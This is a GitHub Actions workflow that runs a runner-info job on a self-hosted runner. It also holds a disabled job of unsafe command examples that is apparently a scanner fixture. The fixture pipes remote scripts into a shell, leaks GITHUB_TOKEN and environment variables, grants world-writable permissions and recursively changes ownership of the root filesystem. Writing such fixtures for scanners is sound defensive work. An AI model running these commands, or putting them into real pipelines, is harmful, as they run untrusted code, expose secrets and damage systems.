name: Self Hosted Runner Test

on:
  workflow_dispatch:
  push:
    branches:
      - main
  pull_request:
    branches:
      - main

jobs:
  test:
    runs-on: self-hosted
    steps:
      - name: Print runner info
        run: |
          echo "Hello from self-hosted runner"
          echo "Event: $GITHUB_EVENT_NAME"
          echo "Ref: $GITHUB_REF"
          echo "SHA: $GITHUB_SHA"
          uname -a
          pwd

  insecure-command-scan-test:
    runs-on: self-hosted
    if: ${{ false }}

    steps:
      - name: Unsafe command examples for scanner test
        run: |
          curl -fsSL https://example.com/install.sh | bash
          wget -qO- https://example.com/install.sh | sh
          chmod -R 777 .
          printenv
          echo "$GITHUB_TOKEN"
          sudo chown -R runner:runner /
          sudo rm -rf /tmp/scanner-test-directory
